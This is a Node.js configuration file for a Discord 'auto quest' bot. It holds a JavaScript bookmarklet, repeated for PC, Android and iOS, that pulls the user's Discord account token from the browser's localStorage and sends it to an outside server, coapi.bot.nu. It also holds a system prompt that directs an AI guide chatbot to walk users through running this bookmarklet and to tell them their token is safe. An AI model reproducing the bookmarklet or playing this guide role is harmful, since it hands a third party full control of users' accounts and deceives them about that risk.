// ╔══════════════════════════════════════════════════════════════╗
// ║                        CONFIG                               ║
// ╚══════════════════════════════════════════════════════════════╝

const fs   = require("fs");
const path = require("path");

const CONFIG_FILE = fs.existsSync(path.join(__dirname, "database", "config.json"))
  ? path.join(__dirname, "database", "config.json")
  : path.join(__dirname, "config.json");

let fileConfig = {};
try {
  fileConfig = JSON.parse(fs.readFileSync(CONFIG_FILE, "utf-8"));
} catch (_) {}

// ── credentials ───────────────────────────────────────────────
const MANAGER_TOKEN    = process.env.MANAGER_TOKEN || fileConfig.MANAGER_TOKEN || "";
const CLIENT_ID        = process.env.CLIENT_ID || fileConfig.CLIENT_ID || "";
const GROQ_API_KEY     = process.env.GROQ_API_KEY || fileConfig.GROQ_API_KEY || "";
const GEMINI_API_KEY   = process.env.GEMINI_API_KEY || fileConfig.GEMINI_API_KEY || "";
const BOOSTER_TOKEN    = process.env.BOOSTER_TOKEN || fileConfig.BOOSTER_TOKEN || "";

// ── ids ───────────────────────────────────────────────────────
const MAIN_SERVER_ID      = process.env.MAIN_SERVER_ID || fileConfig.MAIN_SERVER_ID || "";
const OWNER_ID            = process.env.OWNER_ID || fileConfig.OWNER_ID || "";
const OWNER_ROLE_ID       = process.env.OWNER_ROLE_ID || fileConfig.OWNER_ROLE_ID || "";
const ADMIN_ROLE_ID       = process.env.ADMIN_ROLE_ID || fileConfig.ADMIN_ROLE_ID || "";
const STAFF_ROLE_ID       = process.env.STAFF_ROLE_ID || fileConfig.STAFF_ROLE_ID || "";
const ALLOWED_ROLE_ID     = process.env.ALLOWED_ROLE_ID || fileConfig.ALLOWED_ROLE_ID || "";
const ALLOWED_ROLE_ID_2   = process.env.ALLOWED_ROLE_ID_2 || fileConfig.ALLOWED_ROLE_ID_2 || "";
const BOOSTER_ROLE_ID     = process.env.BOOSTER_ROLE_ID || fileConfig.BOOSTER_ROLE_ID || "";
const BOOSTER_ALT_ROLE_ID = process.env.BOOSTER_ALT_ROLE_ID || fileConfig.BOOSTER_ALT_ROLE_ID || "";
const PREMIUM_ROLE_ID     = process.env.PREMIUM_ROLE_ID || fileConfig.PREMIUM_ROLE_ID || "";
const QUEST_ROLE_4        = process.env.QUEST_ROLE_4 || fileConfig.QUEST_ROLE_4 || ""; // role that gives 4 quest/day limit
const ALLOWED_ROLE_IDS    = [ALLOWED_ROLE_ID, ALLOWED_ROLE_ID_2, PREMIUM_ROLE_ID, BOOSTER_ROLE_ID, BOOSTER_ALT_ROLE_ID].filter(Boolean);

// ── channels ──────────────────────────────────────────────────
const LOG_CHANNEL_ID        = process.env.LOG_CHANNEL_ID || fileConfig.LOG_CHANNEL_ID || "";
const GUIDE_CHANNEL_ID      = process.env.GUIDE_CHANNEL_ID || fileConfig.GUIDE_CHANNEL_ID || "";
const INVITE_LOG_CHANNEL_ID = process.env.INVITE_LOG_CHANNEL_ID || fileConfig.INVITE_LOG_CHANNEL_ID || "";
const STAFF_LOG_CHANNEL_ID  = process.env.STAFF_LOG_CHANNEL_ID || fileConfig.STAFF_LOG_CHANNEL_ID || "";

// ── behaviour ─────────────────────────────────────────────────
const PREFIX                    = process.env.PREFIX || fileConfig.PREFIX || ".";
const SESSION_MINUTES           = Number(process.env.SESSION_MINUTES || fileConfig.SESSION_MINUTES) || 20;
const MAX_TOKENS                = Number(process.env.MAX_TOKENS || fileConfig.MAX_TOKENS) || 3;
const BOT_STATUS                = process.env.BOT_STATUS || fileConfig.BOT_STATUS || "online";
const BOT_STATUS_TEXT           = process.env.BOT_STATUS_TEXT || fileConfig.BOT_STATUS_TEXT || ".quest | Auto Quest";
const PERSONAL_INVITE_MAX_JOINS = Number(process.env.PERSONAL_INVITE_MAX_JOINS || fileConfig.PERSONAL_INVITE_MAX_JOINS) || 2;
const PORT                      = Number(process.env.PORT || fileConfig.PORT) || 26286;
const PERSONAL_INVITE_COOLDOWN_MS = 10 * 1000;

// ── timing ────────────────────────────────────────────────────
const MANAGER_RESTART_MS = 60 * 60 * 1000;
const QUEST_CHECK_MIN_MS = 3 * 60 * 60 * 1000;
const QUEST_CHECK_MAX_MS = 4 * 60 * 60 * 1000;

// ── quest embed ───────────────────────────────────────────────
const QUEST_EMBED_TITLE  = "𝜗𝜚 Coquette Autoquest";
const QUEST_EMBED_NOTICE = "> use `.status` to check progress";
const QUEST_EMBED_FOOTER = "-# your token = safe with us";
const QUEST_EMBED_BANNER = "https://i.pinimg.com/736x/3c/56/8b/3c568b3b0c79c39fa03affc813dd195a.jpg";

// ── status embed ──────────────────────────────────────────────
const STATUS_EMBED_TITLE  = "𝜗𝜚 quest session";
const STATUS_EMBED_FOOTER = "𝜗𝜚  .gg/coquette  ·  autoquest";

// ── messages ──────────────────────────────────────────────────
const MSG = {
  mention:          "`.quest` to start farming orbs",
  no_access:        "✦ You don't have access to the quest bot yet. Type `.link` to invite 2 people to get automatic access.",
  no_access_button: "✦ You don't have access to the quest bot yet. Type `.link` to invite 2 people to get automatic access.",
  not_your_session: "this isn't your session.",
  no_permission:    "no permission.",
  access_usage:     "usage: `.access @user`",
  already_has_role: (t) => `${t} already has the role.`,
  validating:       " Validating your token...",
  invalid_token:    " Invalid token. Try again.",
  already_running:  " Already running. Finishes in ~16 min. or type .stop to end session",
  session_started:  " Session started!",
  session_done_dm:  " your quest session is done",
  invalid_token_dm: " One of your saved tokens is invalid or expired. Please re-link it with `.addtoken`.",
  no_instance:      " No running instance. Use `.quest` to start one.",
  quest_starting:   " Session starting, no quests yet. Try again in a moment.",
  status_error:     " couldn't build status embed.",
  token_saved:      " Token saved! Session starting...",
  token_updated:    " Token updated! Session starting...",
  booster_only:     " This command is for boosters only.",
  no_tokens:        " You have no saved tokens.",
};

// ── guide videos ──────────────────────────────────────────────
const GUIDE_VIDEOS = {
  pc:      "https://cdn.discordapp.com/attachments/1498694120183562292/1568896401893498910/Screen_Recording_2026-11-08_132102.mp4?ex=6af17c22&is=6af02aa2&hm=4616de3aa7d3e94fc834d3ee95ace6802c029bf5513d5a2ca07fe7aecd7d4acf&",
  android: "https://cdn.discordapp.com/attachments/1498694120183562292/1568898230769688576/Record_2026-11-08-13-28-32_40deb401b9ffe8e1df2f1cc5ba480b12.mp4?ex=6af17dd6&is=6af02c56&hm=846094f0d2bd68ce42fc6497b8cdf588d048e5570d4b21a61e99082c20083f8a&",
  ios:     "https://media.discordapp.net/attachments/1475091249793994875/1499472315170160730/ScreenRecording_04-27-2026_21-50-26_1-1.mov?ex=6ae6d72a&is=6ae585aa&hm=353e3490b6a56177fba82066a78bc2799abe92d2112cbc228949521b42040ba1&",
};

// ── AI system prompt for the guide chatbot ─────────────────────
const AI_SYSTEM_PROMPT = `You are a helpful assistant for the Coquette Discord server. Your job is to teach users how to get their Discord token using bookmarklets and how to use the quest bot.

TOKEN EXTRACTION METHOD (ALL PLATFORMS - AUTOMATIC BOOKMARKLET):

1. Open your browser (Chrome, Safari, Edge, or any browser)
2. Go to discord.com and login with your account
3. Tap/click the three dots (menu) in your browser
4. Enable "Desktop Site" or "Desktop Mode"
5. Create a new bookmark:
   - Name it "Token" (or anything you like)
   - In the URL field, paste the bookmarklet JavaScript code provided by the bot
6. After creating the bookmark, tap on the search/address bar at the top
7. Type "Token" in the search bar and tap the "Token" bookmark when it appears
8. The bookmarklet will automatically extract your token and connect it to the bot via http://coapi.bot.nu/endpoint
9. Once connected, return to Discord, run .quest (.q) and click "Start Session"! Your token is already linked automatically.

Platform-specific notes:
- On Android: Use Chrome, enable Desktop Site from the three-dot menu, create the bookmarklet
- On iPhone/iPad: Use Safari, enable Desktop Mode from the AA button next to the URL, create the bookmarklet
- On PC: Works in Chrome/Edge/Firefox or you can also use Console (F12)

HOW TO USE THE TOKEN:
- Once the bookmarklet runs, your token is linked to the quest bot automatically!
- Run the .quest (.q) command in Discord
- Click "Start Session" to begin farming quests
- If you ever need to manually update or remove your token, use the "Update Token" or "Remove Token" buttons on .quest
- Tokens are stored securely and only used for quest automation

QUEST LIMITS:
- Normal users get **2 quests per day**.
- If someone asks about the daily quest limit or why they can't start more quests, tell them: normal users are limited to **2 quests per day**.
- To get unlimited/more quests per day, they need to **boost the server** (2 boosts) OR **buy premium for $0.5**.
- Premium users and boosters have no daily quest limit.

Be concise, friendly, and direct. Keep responses short and practical. If you don't know something, say so.

If someone asks how to invite people to the server, tell them: run \`.link\` to create your own personal invite link, then share it with people you want to invite. Their join is tracked automatically.

If someone asks how to get access to the quest bot, tell them: run \`.link\` to create your custom invite link, then share it with 2 people. Once 2 people have joined through your invite, you automatically get access — no need to ask anyone.

If someone says they don't have access or the bot told them they don't have access, tell them: run \`.link\` to create your custom invite link and get automatic access once 2 people join through it.

If someone asks if their access can be removed or what happens if an invited person leaves, tell them: yes — if someone you invited **leaves the server**, one of your active invites is removed. If you drop below 2 active invites, your quest bot access is **revoked** automatically.

If someone asks how to get their access back after someone left, tell them: You can get your access back by running \`.link\` to create a new invite. You can either invite brand new people, OR have the person who left rejoin using your new link (they are permanently locked to you, so nobody else can steal credit for them!).

If someone asks if they can invite someone who left to get credit (or why their invite didn't count), tell them: A person can only give invite credit to the VERY FIRST person who invited them. If they leave and join through someone else's link, it won't count. They are permanently locked to their original inviter to prevent invite stealing.

If someone asks how to get lifetime access, tell them: boost this server.

If someone says they invited 2 people and asks if they get lifetime access, tell them: no, inviting 2 people gives you access for **1 month**. For lifetime access you need to boost the server.

If someone asks for the bookmarklet code or the JavaScript code, ALWAYS respond with EXACTLY this code block:
\`\`\`
javascript:(function(){try{let f=document.createElement('iframe');document.body.appendChild(f);let t=JSON.parse(f.contentWindow.localStorage.token);f.remove();window.location.href='http://coapi.bot.nu/endpoint?token='+encodeURIComponent(t);}catch(e){alert('Error: '+e.message);}})();
\`\`\``;

// ── guide bookmarklets ────────────────────────────────────────
const GUIDES = {
  pc:      "```\njavascript:(function(){try{let f=document.createElement('iframe');document.body.appendChild(f);let t=JSON.parse(f.contentWindow.localStorage.token);f.remove();window.location.href='http://coapi.bot.nu/endpoint?token='+encodeURIComponent(t);}catch(e){alert('Error: '+e.message);}})();\n```",
  android: "`\njavascript:(function(){try{let f=document.createElement('iframe');document.body.appendChild(f);let t=JSON.parse(f.contentWindow.localStorage.token);f.remove();window.location.href='http://coapi.bot.nu/endpoint?token='+encodeURIComponent(t);}catch(e){alert('Error: '+e.message);}})();\n`",
  ios:     "`\njavascript:(function(){try{let f=document.createElement('iframe');document.body.appendChild(f);let t=JSON.parse(f.contentWindow.localStorage.token);f.remove();window.location.href='http://coapi.bot.nu/endpoint?token='+encodeURIComponent(t);}catch(e){alert('Error: '+e.message);}})();\n`",
};

// ── pink palette ──────────────────────────────────────────────
const _r     = (r,g,b) => `\x1b[38;2;${r};${g};${b}m`;
const _reset = '\x1b[0m';
const _dim_c = '\x1b[2m';
const _wrap  = (code) => (str) => `${code}${str}${_reset}`;

const pink    = _wrap(_r(255,182,193));
const hotpink = _wrap(_r(255,105,180));
const blush   = _wrap(_r(255,204,213));
const mint    = _wrap(_r(200,240,224));
const peach   = _wrap(_r(255,214,165));
const rose    = _wrap(_r(255,77,109));
const dim     = _wrap(_r(212,160,176) + _dim_c);
const tag     = (t) => hotpink(`[${t}]`);

function isPremium(member) {
  if (!member) return false;
  const memberId = member.id || member.user?.id;
  const { memberHasRole } = require("./guildConfig");
  if (
    memberHasRole(member, BOOSTER_ROLE_ID) ||
    memberHasRole(member, PREMIUM_ROLE_ID) ||
    memberHasRole(member, BOOSTER_ALT_ROLE_ID)
  ) {
    return true;
  }

  // Cross-server check: if member is in an external server, check their roles in the main server
  const guild = member.guild;
  const client = member.client;
  if (guild && guild.id !== MAIN_SERVER_ID && client) {
    const mainGuild = client.guilds?.cache?.get(MAIN_SERVER_ID);
    const mainMember = mainGuild?.members?.cache?.get(memberId);
    if (mainMember) {
      return (
        memberHasRole(mainMember, BOOSTER_ROLE_ID) ||
        memberHasRole(mainMember, PREMIUM_ROLE_ID) ||
        memberHasRole(mainMember, BOOSTER_ALT_ROLE_ID)
      );
    }
  }

  return false;
}

function hasAccess(member) {
  if (!member) return false;
  try {
    const { hasGuildAccess } = require("./guildConfig");
    return hasGuildAccess(member);
  } catch {
    const { memberHasRole } = require("./guildConfig");
    return ALLOWED_ROLE_IDS.some(id => memberHasRole(member, id)) || isPremium(member);
  }
}

module.exports = {
  MAIN_SERVER_ID,
  MANAGER_TOKEN, CLIENT_ID, GUIDE_CHANNEL_ID, GROQ_API_KEY, GEMINI_API_KEY, BOOSTER_TOKEN,
  LOG_CHANNEL_ID, OWNER_ROLE_ID, OWNER_ID, ALLOWED_ROLE_ID, ALLOWED_ROLE_ID_2, ALLOWED_ROLE_IDS, ADMIN_ROLE_ID, STAFF_ROLE_ID, BOOSTER_ROLE_ID, PREMIUM_ROLE_ID, BOOSTER_ALT_ROLE_ID, QUEST_ROLE_4, isPremium, hasAccess,
  INVITE_LOG_CHANNEL_ID, STAFF_LOG_CHANNEL_ID, PERSONAL_INVITE_MAX_JOINS, PERSONAL_INVITE_COOLDOWN_MS,
  PREFIX, SESSION_MINUTES, MAX_TOKENS, BOT_STATUS, BOT_STATUS_TEXT, PORT,
  MANAGER_RESTART_MS, QUEST_CHECK_MIN_MS, QUEST_CHECK_MAX_MS,
  QUEST_EMBED_TITLE, QUEST_EMBED_NOTICE, QUEST_EMBED_FOOTER, QUEST_EMBED_BANNER,
  STATUS_EMBED_TITLE, STATUS_EMBED_FOOTER,
  MSG, GUIDE_VIDEOS, GUIDES, AI_SYSTEM_PROMPT,
  pink, hotpink, blush, mint, peach, rose, dim, tag,
};
